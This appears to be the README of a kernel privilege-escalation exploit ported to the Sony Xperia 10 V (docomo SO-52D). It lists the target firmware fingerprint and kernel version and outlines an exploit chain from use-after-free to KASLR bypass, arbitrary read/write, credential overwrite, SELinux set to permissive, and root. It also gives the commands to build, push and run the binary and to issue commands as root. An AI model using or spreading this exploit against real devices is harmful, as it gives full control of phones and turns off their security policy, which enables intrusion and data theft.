# ghostlock_5.4_so-52d

Ported from [GhostLock-H80GT](https://github.com/yakidango-official/GhostLock-H80GT)
to the Sony Xperia 10 V (SO-52D).

## SO-52D target

| Component | Configuration |
| --- | --- |
| Device | Sony Xperia 10 V, docomo SO-52D |
| SoC | Qualcomm SM6375 |
| Architecture | Android ARM64 (`aarch64`) |
| Firmware fingerprint | `docomo/SO-52D/SO-52D:15/68.2.A.3.123:user/release-keys` |
| Kernel | `5.4.295-qgki-g1da550e1d37c` |

5.4 chain: `UAF → KASLR → arbitrary R/W → cred → SELinux permissive → root`.

## Usage

```sh
make -C exploit NDK_ROOT="$NDK" -j2 bin
adb push exploit/build/so52d-5.4.295/bin/exploit_static /data/local/tmp/gl
adb shell 'chmod 755 /data/local/tmp/gl; /data/local/tmp/gl >/data/local/tmp/gl.log 2>&1'

# after ~40s
adb shell 'echo id >/data/local/tmp/gl_root_cmd; sleep 1; cat /data/local/tmp/gl_root_out'
```

Reboot clears root; do not kill the parked anchor processes.
